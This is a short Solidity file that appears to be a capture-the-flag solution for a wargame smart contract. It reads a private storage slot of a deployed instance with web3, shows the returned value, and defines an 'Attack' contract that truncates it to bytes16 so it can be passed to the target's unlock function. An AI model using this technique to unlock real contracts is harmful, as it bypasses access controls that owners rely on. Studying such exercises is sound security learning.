// Instance Address: 0xcA6c34b83458DfE515546264815d023D1D22c0CD

/*
await web3.eth.getStorageAt("0xcA6c34b83458DfE515546264815d023D1D22c0CD", 5);
=> 0xe2c067deb88c43c044e2cce1a5caf3f91e371f1103feecfcf34613d6a17834dd
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    bytes16 public data;

    constructor (bytes32 _data) {
        data = bytes16(_data);
    }
}
/*

Got the storage and then converted bytes32 to bytes16. Input that in the unlock function

 */